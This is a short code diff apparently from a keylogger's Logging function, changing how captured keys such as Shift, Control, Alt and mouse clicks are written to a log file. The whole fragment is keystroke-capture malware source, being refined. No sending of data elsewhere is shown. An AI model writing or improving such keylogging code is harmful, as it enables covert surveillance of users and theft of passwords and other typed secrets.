@@ -29,7 +29,7 @@ void Logging(){
                         log << "\n";//go to next line
                         break;
                     case VK_SHIFT:
-                        log << c;
+                        log << "Shift";
                         break;
                     case VK_CONTROL:
                         log << "[control]";
@@ -43,13 +43,13 @@ void Logging(){
                     case VK_MENU:
                         log << "[alt]";
                     case VK_LBUTTON:
-                        log << "Lclick";
+                        log << "Lclick\n";
                         break;
                     case VK_RBUTTON:
-                        log << "Rclick";
+                        log << "Rclick\n";
                         break;
                     default:
-                        log << c.ToLower();
+                        log << c;
                 }
                 log.close();
             }
